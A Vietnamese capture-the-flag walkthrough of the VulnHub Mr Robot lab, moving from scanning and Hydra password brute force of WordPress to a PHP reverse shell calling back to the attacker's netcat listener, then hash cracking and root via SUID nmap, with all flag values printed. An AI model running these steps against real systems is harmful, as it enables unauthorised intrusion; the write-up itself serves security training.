# Giới Thiệu

Hôm nay mình thực hiện khai thác một Lab nổi tiếng trên Vulnhub là Mr Robot, Lab này chứa 3 key để bạn tìm kiếm thông qua các lỗ hỏng trong máy, Mr Robot là một bộ phim nổi tiếng về tâm lí, kịch tính và hacking với nhân vật chính là **Elliot Alderson**, bạn có thể xem phim để biết thêm chi tiết

## Xây dựng Lab

Đầu tiên chúng ta sẽ lên website của VulnHub và tìm kiếm lab tên là **Mr Robot** ở đó bạn sẽ thấy được một đường dẫn để tải file có đuôi là `.ova`, sau khi tải về thành công chúng ta sẽ sử dụng một ứng dụng giả lập bất kỳ để tạo máy ảo, ở đây mình sẽ dùng **Oracle VirtualBox** để tạo.

![Screenshot_20260414_185107.png](jb-image:img_1776167624242_3ed883e201db2)

Bên trong giao diện của VirtualBox nhìn bên trên trái của giao diện, sẽ thấy mục `file`, trong `file` ta chọn `Import Appliance` 

![Screenshot_20260414_185658.png](jb-image:img_1776167905397_a22cadce075998)

Bên trong giao diện ta chọn icon tệp như trong hình, sau đó chọn đường dẫn chứa file `.ova` đã tải trước đó, xong ta ấn `Finish`
  Khi đó bên ngoài giao diện VirtualBox sẽ có một máy ảo được tạo, chọn vào nó và chọn `start`.
## Reconnaisance
  trên máy attacker, ta sẽ quét mạng để tìm `ip` của máy ảo

  `netdiscover -i 'interface'` hoặc dùng `nmap -sn -Pn 'ip' + subnet`

  ![Screenshot_20260414_203442.png](jb-image:img_1776173771464_bf7cb296f1bee)

  Sau khi đã tìm được ip ta tiến hành quét với nmap để tìm các `service` và `port` đang mở

  `nmap -A -Pn <ip>`

```bash
$ nmap -A -Pn 192.168.2.15
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 20:36 +07
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.2.15 (192.168.2.15)
Host is up (0.00064s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 08:00:27:B6:ED:EC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 3.2 - 4.14 (94%), Amazon Fire TV (93%), Linux 3.2 - 3.8 (93%), Linux 3.13 - 4.4 (93%), Linux 3.18 (93%), Linux 3.13 or 4.2 (92%), Linux 4.4 (92%), Linux 2.6.32 - 3.13 (91%), Synology DiskStation Manager 7.1 (Linux 4.4) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.64 ms 192.168.2.15 (192.168.2.15)
```

Phát hiện `port 80` với service là `http`, hãy thử truy cập vào ip bằng trình duyệt

![Screenshot_20260414_192502.png](jb-image:img_1776169541130_52c9df929cb628)

Giao diện của trang web trông như thế này, bên trong chỉ có các câu lệnh bình thường không có thông tin gì quan trọng, vì vậy ta chuyển sang `Scanning`
## Scanning
thực hiện `brute force` các đường dẫn của trang web bằng `gobuster`

`gobuster dir -u http://192.168.2.15 -w <wordlist> -s 200,301,302,403 -b ""`

+ `dir`: sử dụng chế độ **directory/file enumeration** của **gobuster**
+ `-u`: đường dẫn của trang web
+ `-w`: sử dụng wordlist để thực hiện brute force
+ `-s`: chỉ chấp nhận các **status** được liệt kê
+ `-b`: để đưa các status được liệt kê vào blacklist

```bash
$ gobuster dir -u http://192.168.2.15 -w /usr/share/wordlists/dirb/common.txt -s 200,301,302,403 -b ""
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://192.168.2.15
[+] Method:         GET
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   403,200,301,302
[+] User Agent:     gobuster/3.6
[+] Timeout:        10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://192.168.2.15/0/]
/admin                (Status: 301) [Size: 234] [--> http://192.168.2.15/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://192.168.2.15/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://192.168.2.15/audio/]
/blog                 (Status: 301) [Size: 233] [--> http://192.168.2.15/blog/]
/css                  (Status: 301) [Size: 232] [--> http://192.168.2.15/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://192.168.2.15/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://192.168.2.15/feed/]
/images               (Status: 301) [Size: 235] [--> http://192.168.2.15/images/]
/image                (Status: 301) [Size: 0] [--> http://192.168.2.15/image/]
/Image                (Status: 301) [Size: 0] [--> http://192.168.2.15/Image/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.2.15/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 231] [--> http://192.168.2.15/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://192.168.2.15/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://192.168.2.15/]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 301) [Size: 0] [--> http://192.168.2.15/feed/rdf/]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://192.168.2.15/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://192.168.2.15/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 234] [--> http://192.168.2.15/video/]
/wp-admin             (Status: 301) [Size: 237] [--> http://192.168.2.15/wp-admin/]
/wp-content           (Status: 301) [Size: 239] [--> http://192.168.2.15/wp-content/]
/wp-includes          (Status: 301) [Size: 240] [--> http://192.168.2.15/wp-includes/]
/wp-config            (Status: 200) [Size: 0]
/wp-cron              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2664]
/wp-signup            (Status: 302) [Size: 0] [--> http://192.168.2.15/wp-login.php?action=register]
Progress: 4614 / 4615 (99.98%)
```

Ở đây có các đường dẫn đáng quan tâm là `/admin`, `/robots.txt`, `/wp-admin`, trước tiên hãy xem thử `/robots.txt`

`curl -d HTTP http://192.168.2.15/robots.txt`

```bash
$ curl -d HTTP http://192.168.2.15/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Trong đây có 2 file và ta có thể tải xuống đó chính là `key-1-of-3.txt` và `fsocity.dic`, ta thực hiện tải bằng `wget`

`wget -i http://192.168.2.15/robots.txt`

+ `-i`: **wget** sẽ đọc input bên trong đường dẫn và sẽ tải những đường dẫn chứa file

Thử xem nội dung bên trong file bằng `cat`
```bash
$ cat key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9
$ cat fsocity.dic
true
false
wikia
from
the
now
Wikia
extensions
scss
window
http
var
page
Robot
Elliot
styles
and
document
mrrobot
com
ago
function
eps1
null
...
```

Với 2 file này ta vẫn chưa thể làm được gì hãy thử truy cập vào đường dẫn `wp-login`, chỉ là một trang đăng nhập nhưng hãy thử xem html của trang bằng `curl`

`curl http://192.168.2.15/wp-login`

```html
<!DOCTYPE html>
<!--[if IE 8]>
<html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 8) ]><!-->
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<!--<![endif]-->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
<title>user&#039;s Blog! &rsaquo; Log In</title>
<link rel='stylesheet' id='buttons-css' href='http://192.168.2.15/wp-includes/css/buttons.min.css,qver=4.3.1.pagespeed.ce.ZQERzcrubG.css' type='text/css' media='all'/>
<link rel='stylesheet' id='open-sans-css' href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.3.1' type='text/css' media='all'/>
<link rel='stylesheet' id='dashicons-css' href='http://192.168.2.15/wp-includes/css/dashicons.min.css,qver=4.3.1.pagespeed.ce.5l-W1PUiez.css' type='text/css' media='all'/>
<link rel='stylesheet' id='login-css' href='http://192.168.2.15/wp-admin/css/login.min.css?ver=4.3.1' type='text/css' media='all'/>
<meta name='robots' content='noindex,follow'/>
</head>
<body class="login login-action-login wp-core-ui  locale-en-us">
<div id="login">
<h1><a href="https://wordpress.org/" title="Powered by WordPress" tabindex="-1">user&#039;s Blog!</a></h1>

<form name="loginform" id="loginform" action="http://192.168.2.15/wp-login.php" method="post">
<p>
<label for="user_login">Username<br/>
<input type="text" name="log" id="user_login" class="input" value="" size="20"/></label>
</p>
<p>
<label for="user_pass">Password<br/>
<input type="password" name="pwd" id="user_pass" class="input" value="" size="20"/></label>
</p>
<p class="forgetmenot"><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"/> Remember Me</label></p>
<p class="submit">
<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Log In"/>
<input type="hidden" name="redirect_to" value="http://192.168.2.15/wp-admin/"/>
<input type="hidden" name="testcookie" value="1"/>
</p>
</form>

<p id="nav">
<a href="http://192.168.2.15/wp-login.php?action=lostpassword" title="Password Lost and Found">Lost your password?</a>
</p>

<script type="text/javascript">function wp_attempt_focus(){setTimeout(function(){try{d=document.getElementById('user_login');d.focus();d.select();}catch(e){}},200);}
wp_attempt_focus();if(typeof wpOnload=='function')wpOnload();</script>

<p id="backtoblog"><a href="http://192.168.2.15/" title="Are you lost?">&larr; Back to user&#039;s Blog!</a></p>

</div>


<div class="clear"></div>
</body>
</html>
```

Từ mã nguồn ta có thể biết được phiên bản của wordpress là `4.3.1` và sử dụng extension `Wappalyzer` biết được phiên bản của `PHP` là `5.5.29`
Bởi vì phiên bản `4.3.1` của wordpress đã vá các lỗ hỏng như `XSS` và `SQL injections` nên ta đi tới hướng khai thác khác

![Screenshot_20260415_175448.png](jb-image:img_1776250534683_e84657b16352d)

Khi nhập thử một vài username thì trang login sẽ in ra một thông báo `Invalid username` chúng ta có thể thử brute force bằng `hydra` nhưng trước tiên chúng ta cần sort file `fsocity.dic` vì bên trong file có nhiều tên trùng lặp

`sort fsocity.dic | uniq > newfile.dic`

Và sau đó brute force bằng `hydra` 

`hydra -L newfile.dic -p 1234 192.168.2.15 -v http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"`

+ `-L`: chọn một danh sách để làm username
+ `-p`: chọn một chuỗi dể làm password
+ `-v`: verbose để debug
+ `http-post-form`: sử dụng POST để gửi request

```bash
$ hydra -L newfile.dic -p 1234 192.168.2.15 -v http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-15 18:22:44
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) froma previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://192.168.2.15:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 3871.00 tries/min, 3871 tries in 00:01h, 7581 to do in 00:02h, 16 active

[80][http-post-form] host: 192.168.2.15   login: elliot   password: 1234
[80][http-post-form] host: 192.168.2.15   login: Elliot   password: 1234
[80][http-post-form] host: 192.168.2.15   login: ELLIOT   password: 1234
```

Có thể thấy các username được liệt kê từ hydra trả về một thông báo khác ngoài `Invalid username` điều này có nghĩa là với các username không đúng thì nó sẽ chỉ trả về `Invalid username` và khi ta brute force bằng hydra thì nó sẽ trả lại một thông báo như trong hình

![Screenshot_20260415_183122.png](jb-image:img_1776252716377_1e304a296929c)

Từ lỗi xử lý này ta có thể biết được username là `Elliot`, `ELLIOT`, `elliot`, bây giờ ta chỉ cần brute force password theo cách tương tự bằng hydra

```bash
$ hydra -l elliot -P newfile.dic 192.168.2.15 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this isnon-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-15 19:04:06
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://192.168.2.15:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect
[STATUS] 3595.00 tries/min, 3595 tries in 00:01h, 7857 to do in 00:03h, 16 active
[80][http-post-form] host: 192.168.2.15   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```

Bingo hydra đã tìm được password là `ER28-0652` với username là `elliot` hãy đăng nhập vào trang wordpress

## Exploitation

Sau khi đã vào được Wordpress admin panel bề mặt tấn công sẽ rộng hơn, chúng ta có thể dùng nhiều cách để khai thác như là:
+ **upload một plugin giả**
+ **sử dung Template 404**

Trong phần này ta sẽ chỉ sử dụng kiểu khai thác bằng cách sử dụng **Template 404**
Đầu tiên ở trang chủ ta chọn vào `Appearance` -> `Editor` -> `404 Template`, sau khi đã vào trang chủ upload ta sử dụng payload của pentestmonkey 

`https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php`

Thay thế toàn bộ nội dung bên trong 404.php thành payload trên, trong payload có các tham số như `$ip` và `$port` chúng ta phải thay  ip và port của thiết bị, ở đây ip của mình là `192.168.2.49` và port mình sẽ sử dụng port `4444` sau đó lưu lại.

## Reverse Shell

Chúng ta sử dụng netcat để thiết lập kết nối tới máy nạn nhân

`nc -lvp 4444`

Sau đó ta truy cập vào bất kỳ đường dẫn nào của trang WP

```bash
$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.2.15 54903
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
14:26:47 up  4:10,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

## Shell Upgrade
Như vậy chúng ta đã có được shell của nạn nhân nhưng hiện tại quyền vẫn còn hạn chế, Chúng ta nâng cấp shell bằng lệnh

`python -c 'import pty; pty.spawn("/bin/bash")'`

 Hãy xem thử có gì thú vị không

```bash
daemon@linux:~$ cd /home/robot
cd /home/robot
daemon@linux:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$
```

Tìm được một file flag thứ 2 và một file password raw md5, nếu ta thử xem file `key-2-of-3.txt` thì sẽ bị chặn bởi vì chỉ có user `robot` mới có thể xem, hãy thử brute force file `password.raw-md5` bằng hashcat 

```bash
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Thu Apr 16 18:25:31 2026 (17 secs)
Time.Estimated...: Thu Apr 16 18:25:48 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/crackstation.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17049.0 kH/s (5.47ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 297533440/1212336035 (24.54%)
Rejected.........: 0/297533440 (0.00%)
Restore.Point....: 296222720/1212336035 (24.43%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ab3A& -> abdulhadialmailam
Hardware.Mon.#1..: Temp: 51c Util: 40% Core:1267MHz Mem:5500MHz Bus:8
```

Password của user `Robot` chính là `abcdefghijklmnopqrstuvwxyz` ta đăng nhập vào user ấy

```bash
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## Privilege escalation

Sau khi đã có quyền của user `robot` hãy tìm kiếm các tác vụ sử dụng quyền root

`find / -perm /4000 2>/dev/null`

```bash
robot@linux:~$ find / -perm /4000 2>/dev/null
find / -perm /4000 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
robot@linux:~$
```

Thấy được nmap có sử dụng quyền cao nhất, thử kiểm tra phiên bản của nmap
```bash
robot@linux:~$ nmap -V
nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

![Screenshot_20260416_183748.png](jb-image:img_1776339497829_152d1483c7d7e)

Ở các phiên bản từ 2.02 tới 5.21 có một lỗ hỏng để leo thang đặc quyền, đối chiếu với phiên bản mà chúng ta đã thấy, chúng ta có thể sử dụng chức năng `--interactive` để thực hiện quá trình leo thang đặc quyền

```bash
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# ls -la
ls -la
total 32
drwx------  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
-rw-------  1 root root 4058 Nov 14  2015 .bash_history
-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
drwx------  2 root root 4096 Nov 13  2015 .cache
-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-------  1 root root 1024 Sep 16  2015 .rnd
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

Như vậy đã xong ta đã hoàn thành capture 3 flag của machine `mr robot`.

